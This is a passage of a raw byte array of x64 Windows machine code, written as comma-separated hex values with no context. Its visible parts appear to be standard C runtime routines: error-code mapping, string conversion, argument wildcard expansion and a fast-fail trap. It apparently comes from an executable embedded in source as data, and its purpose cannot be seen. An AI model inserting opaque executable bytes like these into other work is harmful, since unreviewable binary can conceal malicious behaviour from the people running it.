0x83, 0xec, 0x70, 0x48, 0x83, 0x65, 0xc0, 0x0, 0x83, 0x3d, 0x9f, 0x3e, 0x1, 0x0, 0x0, 0xc6, 0x45, 0xd0, 0x0, 0xc6, 0x45, 0xe8, 0x0, 0xc6, 0x45, 0xf0, 0x0, 0xc6, 0x45, 0xf8, 0x0, 0x75, 0x10, 0xf, 0x10, 0x5, 0x16, 0x2f, 0x1, 0x0, 0xc6, 0x45, 0xe8, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xd8, 0x48, 0x8d, 0x45, 0xc0, 0x48, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8b, 0x45, 0x30, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x4a, 0x0, 0x0, 0x0, 0x80, 0x7d, 0xe8, 0x2, 0x75, 0xb, 0x48, 0x8b, 0x45, 0xc0, 0x83, 0xa0, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x80, 0x7d, 0xf0, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xec, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0xab, 0xf3, 0xff, 0xff, 0x89, 0x58, 0x20, 0x80, 0x7d, 0xf8, 0x0, 0x74, 0xf, 0x8b, 0x5d, 0xf4, 0x48, 0x8d, 0x4d, 0xc0, 0xe8, 0x96, 0xf3, 0xff, 0xff, 0x89, 0x58, 0x24, 0x48, 0x8b, 0x9c, 0x24, 0x80, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x70, 0x5d, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xe9, 0x41, 0x8b, 0xd9, 0x48, 0x8b, 0x4c, 0x24, 0x68, 0x49, 0x8b, 0xf8, 0x48, 0x8b, 0xf2, 0xe8, 0x1e, 0xfd, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x74, 0x47, 0x48, 0x8b, 0x80, 0xb8, 0x3, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3b, 0x49, 0xba, 0x70, 0x2a, 0x57, 0x34, 0x48, 0x1f, 0xbc, 0xd6, 0x48, 0x8b, 0x4c, 0x24, 0x60, 0x48, 0x8b, 0xd6, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xcd, 0x44, 0x8b, 0xcb, 0xff, 0x15, 0xeb, 0x88, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x30, 0x5f, 0xc3, 0x48, 0x8b, 0x54, 0x24, 0x68, 0x48, 0x8d, 0xd, 0x3a, 0x37, 0x1, 0x0, 0xe8, 0x2d, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0x1d, 0x36, 0x27, 0x1, 0x0, 0x48, 0x8b, 0x8, 0x41, 0x8b, 0xc3, 0x4c, 0x33, 0xd9, 0x83, 0xe0, 0x3f, 0x8a, 0xc8, 0x49, 0xd3, 0xcb, 0x4d, 0x85, 0xdb, 0x74, 0xf, 0x49, 0xba, 0x70, 0x2a, 0x57, 0x34, 0x48, 0x1f, 0xbc, 0xd6, 0x49, 0x8b, 0xc3, 0xeb, 0x92, 0x48, 0x8b, 0x44, 0x24, 0x60, 0x44, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x22, 0x0, 0x0, 0x0, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x38, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0x7b, 0xfe, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x38, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xb9, 0x17, 0x0, 0x0, 0x0, 0xff, 0x15, 0x4d, 0x86, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x7, 0xb9, 0x5, 0x0, 0x0, 0x0, 0xcd, 0x29, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xba, 0x17, 0x4, 0x0, 0xc0, 0x41, 0x8d, 0x48, 0x1, 0xe8, 0xe2, 0xfc, 0xff, 0xff, 0xff, 0x15, 0xd0, 0x86, 0x0, 0x0, 0x48, 0x8b, 0xc8, 0xba, 0x17, 0x4, 0x0, 0xc0, 0x48, 0x83, 0xc4, 0x28, 0x48, 0xff, 0x25, 0xcd, 0x86, 0x0, 0x0, 0xcc, 0x33, 0xc0, 0x4c, 0x8d, 0xd, 0x53, 0x9b, 0x0, 0x0, 0x49, 0x8b, 0xd1, 0x44, 0x8d, 0x40, 0x8, 0x3b, 0xa, 0x74, 0x2b, 0xff, 0xc0, 0x49, 0x3, 0xd0, 0x83, 0xf8, 0x2d, 0x72, 0xf2, 0x8d, 0x41, 0xed, 0x83, 0xf8, 0x11, 0x77, 0x6, 0xb8, 0xd, 0x0, 0x0, 0x0, 0xc3, 0x81, 0xc1, 0x44, 0xff, 0xff, 0xff, 0xb8, 0x16, 0x0, 0x0, 0x0, 0x83, 0xf9, 0xe, 0x41, 0xf, 0x46, 0xc0, 0xc3, 0x41, 0x8b, 0x44, 0xc1, 0x4, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x8b, 0xd9, 0xe8, 0xdf, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0x73, 0x26, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x24, 0x8b, 0xcb, 0x89, 0x18, 0xe8, 0x90, 0xff, 0xff, 0xff, 0x8b, 0xd8, 0xe8, 0xbd, 0xf8, 0xff, 0xff, 0x48, 0x8d, 0xd, 0x52, 0x26, 0x1, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x4, 0x48, 0x8d, 0x48, 0x20, 0x89, 0x19, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xda, 0xc6, 0x42, 0x38, 0x1, 0x89, 0x4a, 0x34, 0xe8, 0x5b, 0xff, 0xff, 0xff, 0x89, 0x43, 0x2c, 0xc6, 0x43, 0x30, 0x1, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x77, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0xb, 0x26, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x24, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x48, 0x83, 0xec, 0x28, 0xe8, 0x57, 0xf8, 0xff, 0xff, 0x48, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x8d, 0x5, 0xe7, 0x25, 0x1, 0x0, 0xeb, 0x4, 0x48, 0x83, 0xc0, 0x20, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xc2, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xc9, 0x74, 0xe, 0x33, 0xd2, 0x48, 0x8d, 0x42, 0xe0, 0x48, 0xf7, 0xf3, 0x49, 0x3b, 0xc0, 0x72, 0x43, 0x49, 0xf, 0xaf, 0xd8, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x48, 0x85, 0xdb, 0x48, 0xf, 0x44, 0xd8, 0xeb, 0x15, 0xe8, 0xa2, 0x34, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x28, 0x48, 0x8b, 0xcb, 0xe8, 0x46, 0x24, 0x0, 0x0, 0x85, 0xc0, 0x74, 0x1c, 0x48, 0x8b, 0xd, 0x2b, 0x37, 0x1, 0x0, 0x4c, 0x8b, 0xc3, 0xba, 0x8, 0x0, 0x0, 0x0, 0xff, 0x15, 0x95, 0x85, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0xd1, 0xeb, 0xd, 0xe8, 0x79, 0xff, 0xff, 0xff, 0xc7, 0x0, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x85, 0xc9, 0x74, 0x36, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0xc1, 0x33, 0xd2, 0x48, 0x8b, 0xd, 0xea, 0x36, 0x1, 0x0, 0xff, 0x15, 0x64, 0x85, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0xaa, 0x84, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x67, 0xfe, 0xff, 0xff, 0x8b, 0xd8, 0xe8, 0x34, 0xff, 0xff, 0xff, 0x89, 0x18, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0x48, 0x3b, 0xca, 0x73, 0x4, 0x83, 0xc8, 0xff, 0xc3, 0x33, 0xc0, 0x48, 0x3b, 0xca, 0xf, 0x97, 0xc0, 0xc3, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x30, 0x45, 0x33, 0xf6, 0x41, 0x8b, 0xe9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x24, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0x77, 0xff, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x4c, 0x89, 0x73, 0x10, 0x4c, 0x89, 0x73, 0x18, 0x4c, 0x89, 0x73, 0x20, 0xe9, 0xe, 0x1, 0x0, 0x0, 0x44, 0x38, 0x31, 0x75, 0x55, 0x4c, 0x39, 0x72, 0x18, 0x75, 0x45, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0x48, 0xff, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0xb9, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xa, 0x2c, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0xf, 0x94, 0xc2, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0xf, 0x85, 0xc0, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x10, 0x66, 0x44, 0x89, 0x30, 0xeb, 0x9d, 0x41, 0x83, 0xc9, 0xff, 0x44, 0x89, 0x74, 0x24, 0x28, 0x4c, 0x8b, 0xc7, 0x4c, 0x89, 0x74, 0x24, 0x20, 0x8b, 0xcd, 0x41, 0x8d, 0x51, 0xa, 0xe8, 0x28, 0x18, 0x0, 0x0, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x16, 0xff, 0x15, 0xaf, 0x83, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0xb4, 0xfd, 0xff, 0xff, 0xe8, 0x3b, 0xfe, 0xff, 0xff, 0x8b, 0x0, 0xeb, 0x7d, 0x48, 0x8b, 0x53, 0x18, 0x48, 0x3b, 0xf2, 0x76, 0x41, 0x44, 0x38, 0x73, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0xb7, 0xfe, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x48, 0x8d, 0xc, 0x36, 0xe8, 0x7a, 0x2b, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0x48, 0xf, 0x44, 0xd6, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0x75, 0x33, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x89, 0x54, 0x24, 0x28, 0x4c, 0x8b, 0xc7, 0x8b, 0xcd, 0x48, 0x89, 0x44, 0x24, 0x20, 0x41, 0x8d, 0x51, 0xa, 0xe8, 0xa2, 0x17, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x76, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x40, 0x48, 0x8b, 0x6c, 0x24, 0x48, 0x48, 0x8b, 0x74, 0x24, 0x50, 0x48, 0x8b, 0x7c, 0x24, 0x58, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x8b, 0xc4, 0x48, 0x89, 0x58, 0x8, 0x48, 0x89, 0x68, 0x10, 0x48, 0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x41, 0x56, 0x48, 0x83, 0xec, 0x40, 0x45, 0x33, 0xf6, 0x41, 0x8b, 0xe9, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x24, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0xfb, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x4c, 0x89, 0x73, 0x10, 0x4c, 0x89, 0x73, 0x18, 0x4c, 0x89, 0x73, 0x20, 0xe9, 0x20, 0x1, 0x0, 0x0, 0x66, 0x44, 0x39, 0x31, 0x75, 0x54, 0x4c, 0x39, 0x72, 0x18, 0x75, 0x45, 0x44, 0x38, 0x72, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4a, 0x10, 0xe8, 0xcb, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0xb9, 0x1, 0x0, 0x0, 0x0, 0xe8, 0x8d, 0x2a, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0xf, 0x94, 0xc2, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0xf, 0x85, 0xd1, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x43, 0x10, 0x44, 0x88, 0x30, 0xeb, 0x9d, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x41, 0x83, 0xc9, 0xff, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x4c, 0x8b, 0xc7, 0x44, 0x89, 0x74, 0x24, 0x28, 0x33, 0xd2, 0x8b, 0xcd, 0x4c, 0x89, 0x74, 0x24, 0x20, 0xe8, 0x0, 0x17, 0x0, 0x0, 0x48, 0x63, 0xf0, 0x85, 0xc0, 0x75, 0x19, 0xff, 0x15, 0x2b, 0x82, 0x0, 0x0, 0x8b, 0xc8, 0xe8, 0x30, 0xfc, 0xff, 0xff, 0xe8, 0xb7, 0xfc, 0xff, 0xff, 0x8b, 0x0, 0xe9, 0x84, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x53, 0x18, 0x48, 0x3b, 0xf2, 0x76, 0x40, 0x44, 0x38, 0x73, 0x28, 0x74, 0xd, 0x48, 0x8b, 0x4b, 0x10, 0xe8, 0x30, 0xfd, 0xff, 0xff, 0x44, 0x88, 0x73, 0x28, 0x48, 0x8b, 0xce, 0xe8, 0xf4, 0x29, 0x0, 0x0, 0x48, 0x89, 0x43, 0x10, 0x49, 0x8b, 0xd6, 0x48, 0xf7, 0xd8, 0x1b, 0xc0, 0xf7, 0xd0, 0x83, 0xe0, 0xc, 0x48, 0xf, 0x44, 0xd6, 0x85, 0xc0, 0xf, 0x94, 0xc1, 0x88, 0x4b, 0x28, 0x48, 0x89, 0x53, 0x18, 0x85, 0xc0, 0x75, 0x3b, 0x48, 0x8b, 0x43, 0x10, 0x41, 0x83, 0xc9, 0xff, 0x4c, 0x89, 0x74, 0x24, 0x38, 0x4c, 0x8b, 0xc7, 0x4c, 0x89, 0x74, 0x24, 0x30, 0x8b, 0xcd, 0x89, 0x54, 0x24, 0x28, 0x33, 0xd2, 0x48, 0x89, 0x44, 0x24, 0x20, 0xe8, 0x70, 0x16, 0x0, 0x0, 0x48, 0x98, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x6c, 0xff, 0xff, 0xff, 0x48, 0xff, 0xc8, 0x48, 0x89, 0x43, 0x20, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x8b, 0x6c, 0x24, 0x58, 0x48, 0x8b, 0x74, 0x24, 0x60, 0x48, 0x8b, 0x7c, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x40, 0x41, 0x5e, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x45, 0x33, 0xff, 0x4c, 0x8b, 0xea, 0x48, 0x8b, 0xd9, 0x48, 0x85, 0xd2, 0x75, 0x17, 0xe8, 0xe6, 0xfb, 0xff, 0xff, 0x41, 0x8d, 0x5d, 0x16, 0x89, 0x18, 0xe8, 0x9f, 0xfa, 0xff, 0xff, 0x8b, 0xc3, 0xe9, 0xd7, 0x1, 0x0, 0x0, 0xf, 0x57, 0xc0, 0x4c, 0x89, 0x3a, 0x48, 0x8b, 0x1, 0xf3, 0xf, 0x7f, 0x45, 0xe0, 0x4c, 0x89, 0x7d, 0xf0, 0x48, 0x85, 0xc0, 0xf, 0x84, 0x9d, 0x0, 0x0, 0x0, 0x48, 0x8d, 0x55, 0x48, 0x66, 0xc7, 0x45, 0x48, 0x2a, 0x3f, 0x48, 0x8b, 0xc8, 0x44, 0x88, 0x7d, 0x4a, 0xe8, 0x4b, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xb, 0x48, 0x85, 0xc0, 0x75, 0x3c, 0x4c, 0x8d, 0x4d, 0xe0, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0xe8, 0xc1, 0x1, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x74, 0x3a, 0x48, 0x8b, 0x7d, 0xe0, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0x7d, 0xe8, 0xf, 0x84, 0xdd, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb, 0xe8, 0x6, 0xfc, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0x5d, 0xe8, 0x75, 0xee, 0xe9, 0xc6, 0x0, 0x0, 0x0, 0x4c, 0x8d, 0x45, 0xe0, 0x48, 0x8b, 0xd0, 0xe8, 0xf, 0x3, 0x0, 0x0, 0x8b, 0xf0, 0x85, 0xc0, 0x75, 0x9, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x8b, 0x3, 0xeb, 0x82, 0x48, 0x8b, 0x7d, 0xe0, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0x7d, 0xe8, 0xf, 0x84, 0x9a, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb, 0xe8, 0xc3, 0xfb, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0x5d, 0xe8, 0x75, 0xee, 0xe9, 0x83, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x7d, 0xe0, 0x49, 0x83, 0xcc, 0xff, 0x48, 0x8b, 0x75, 0xe8, 0x49, 0x8b, 0xd7, 0x4c, 0x8b, 0xf6, 0x48, 0x89, 0x55, 0x50, 0x4c, 0x2b, 0xf7, 0x48, 0x8b, 0xc7, 0x49, 0xc1, 0xfe, 0x3, 0x49, 0xff, 0xc6, 0x48, 0x3b, 0xfe, 0x74, 0x22, 0x4c, 0x8b, 0x0, 0x49, 0x8b, 0xcc, 0x48, 0xff, 0xc1, 0x45, 0x38, 0x3c, 0x8, 0x75, 0xf7, 0x48, 0xff, 0xc2, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x3, 0xd1, 0x48, 0x3b, 0xc6, 0x75, 0xe2, 0x48, 0x89, 0x55, 0x50, 0x41, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xce, 0xe8, 0x8c, 0xe3, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x75, 0x32, 0x33, 0xc9, 0xe8, 0x4d, 0xfb, 0xff, 0xff, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0xfe, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0x3d, 0xfb, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xde, 0x75, 0xef, 0x41, 0x8b, 0xf4, 0x48, 0x8b, 0xcf, 0xe8, 0x29, 0xfb, 0xff, 0xff, 0x8b, 0xc6, 0xe9, 0x8d, 0x0, 0x0, 0x0, 0x4a, 0x8d, 0xc, 0xf0, 0x4c, 0x8b, 0xf7, 0x48, 0x89, 0x4d, 0x58, 0x4c, 0x8b, 0xe1, 0x48, 0x3b, 0xfe, 0x74, 0x4c, 0x48, 0x2b, 0xc7, 0x48, 0x89, 0x45, 0x48, 0x4d, 0x8b, 0x6, 0x49, 0x83, 0xcf, 0xff, 0x49, 0xff, 0xc7, 0x43, 0x80, 0x3c, 0x38, 0x0, 0x75, 0xf6, 0x48, 0x8b, 0xd1, 0x49, 0xff, 0xc7, 0x49, 0x2b, 0xd4, 0x4d, 0x8b, 0xcf, 0x48, 0x3, 0x55, 0x50, 0x49, 0x8b, 0xcc, 0xe8, 0x5f, 0x33, 0x0, 0x0, 0x85, 0xc0, 0x75, 0x5e, 0x48, 0x8b, 0x45, 0x48, 0x48, 0x8b, 0x4d, 0x58, 0x4e, 0x89, 0x24, 0x30, 0x4d, 0x3, 0xe7, 0x49, 0x83, 0xc6, 0x8, 0x4c, 0x3b, 0xf6, 0x75, 0xbb, 0x33, 0xc9, 0x49, 0x89, 0x5d, 0x0, 0xe8, 0xb8, 0xfa, 0xff, 0xff, 0x48, 0x8b, 0xdf, 0x48, 0x3b, 0xfe, 0x74, 0x11, 0x48, 0x8b, 0xb, 0xe8, 0xa8, 0xfa, 0xff, 0xff, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xde, 0x75, 0xef, 0x48, 0x8b, 0xcf, 0xe8, 0x97, 0xfa, 0xff, 0xff, 0x33, 0xc0, 0x48, 0x8b, 0x9c, 0x24, 0x90, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x50, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5d, 0xc3, 0x48, 0x83, 0x64, 0x24, 0x20, 0x0, 0x45, 0x33, 0xc9, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0xb4, 0xf8, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x48, 0x83, 0xcd, 0xff, 0x49, 0x8b, 0xf9, 0x33, 0xf6, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xea, 0x4c, 0x8b, 0xe1, 0x48, 0xff, 0xc5, 0x40, 0x38, 0x34, 0x29, 0x75, 0xf7, 0xba, 0x1, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc6, 0x48, 0x3, 0xea, 0x48, 0xf7, 0xd0, 0x48, 0x3b, 0xe8, 0x76, 0x20, 0x8d, 0x42, 0xb, 0x48, 0x8b, 0x5c, 0x24, 0x60, 0x48, 0x8b, 0x6c, 0x24, 0x68, 0x48, 0x8b, 0x74, 0x24, 0x70, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0x4d, 0x8d, 0x78, 0x1, 0x4c, 0x3, 0xfd, 0x49, 0x8b, 0xcf, 0xe8, 0x73, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xd8, 0x4d, 0x85, 0xf6, 0x74, 0x19, 0x4d, 0x8b, 0xce, 0x4d, 0x8b, 0xc5, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0x52, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x85, 0xd8, 0x0, 0x0, 0x0, 0x4d, 0x2b, 0xfe, 0x4a, 0x8d, 0xc, 0x33, 0x49, 0x8b, 0xd7, 0x4c, 0x8b, 0xcd, 0x4d, 0x8b, 0xc4, 0xe8, 0x35, 0x32, 0x0, 0x0, 0x85, 0xc0, 0xf, 0x85, 0xbb, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x4f, 0x8, 0x44, 0x8d, 0x78, 0x8, 0x4c, 0x8b, 0x77, 0x10, 0x49, 0x3b, 0xce, 0xf, 0x85, 0x9d, 0x0, 0x0, 0x0, 0x48, 0x39, 0x37, 0x75, 0x2b, 0x41, 0x8b, 0xd7, 0x8d, 0x48, 0x4, 0xe8, 0x10, 0xf9, 0xff, 0xff, 0x33, 0xc9, 0x48, 0x89, 0x7, 0xe8, 0x7e, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xf, 0x48, 0x85, 0xc9, 0x74, 0x42, 0x48, 0x8d, 0x41, 0x20, 0x48, 0x89, 0x4f, 0x8, 0x48, 0x89, 0x47, 0x10, 0xeb, 0x6d, 0x4c, 0x2b, 0x37, 0x48, 0xb8, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x7f, 0x49, 0xc1, 0xfe, 0x3, 0x4c, 0x3b, 0xf0, 0x77, 0x1e, 0x48, 0x8b, 0xf, 0x4b, 0x8d, 0x2c, 0x36, 0x48, 0x8b, 0xd5, 0x4d, 0x8b, 0xc7, 0xe8, 0x98, 0x14, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x75, 0x22, 0x33, 0xc9, 0xe8, 0x34, 0xf9, 0xff, 0xff, 0x48, 0x8b, 0xcb, 0xe8, 0x2c, 0xf9, 0xff, 0xff, 0xbe, 0xc, 0x0, 0x0, 0x0, 0x33, 0xc9, 0xe8, 0x20, 0xf9, 0xff, 0xff, 0x8b, 0xc6, 0xe9, 0x2, 0xff, 0xff, 0xff, 0x4a, 0x8d, 0xc, 0xf0, 0x48, 0x89, 0x7, 0x48, 0x89, 0x4f, 0x8, 0x48, 0x8d, 0xc, 0xe8, 0x48, 0x89, 0x4f, 0x10, 0x33, 0xc9, 0xe8, 0xff, 0xf8, 0xff, 0xff, 0x48, 0x8b, 0x4f, 0x8, 0x48, 0x89, 0x19, 0x4c, 0x1, 0x7f, 0x8, 0xeb, 0xcb, 0x45, 0x33, 0xc9, 0x48, 0x89, 0x74, 0x24, 0x20, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xe8, 0x2a, 0xf7, 0xff, 0xff, 0xcc, 0xcc, 0x40, 0x55, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x8d, 0xac, 0x24, 0xc0, 0xfd, 0xff, 0xff, 0x48, 0x81, 0xec, 0x40, 0x3, 0x0, 0x0, 0x48, 0x8b, 0x5, 0xdb, 0x1d, 0x1, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x85, 0x30, 0x2, 0x0, 0x0, 0x4d, 0x8b, 0xe0, 0x48, 0x8b, 0xf9, 0x48, 0xbb, 0x1, 0x8, 0x0, 0x0, 0x0, 0x20, 0x0, 0x0, 0x48, 0x3b, 0xd1, 0x74, 0x22, 0x8a, 0x2, 0x2c, 0x2f, 0x3c, 0x2d, 0x77, 0xa, 0x48, 0xf, 0xbe, 0xc0, 0x48, 0xf, 0xa3, 0xc3, 0x72, 0x10, 0x48, 0x8b, 0xcf, 0xe8, 0x5a, 0x36, 0x0, 0x0, 0x48, 0x8b, 0xd0, 0x48, 0x3b, 0xc7, 0x75, 0xde, 0x44, 0x8a, 0x2, 0x41, 0x80, 0xf8, 0x3a, 0x75, 0x1e, 0x48, 0x8d, 0x47, 0x1, 0x48, 0x3b, 0xd0, 0x74, 0x15, 0x4d, 0x8b, 0xcc, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x48, 0x8b, 0xcf, 0xe8, 0xf4, 0xfd, 0xff, 0xff, 0xe9, 0xa3, 0x2, 0x0, 0x0, 0x41, 0x80, 0xe8, 0x2f, 0x45, 0x33, 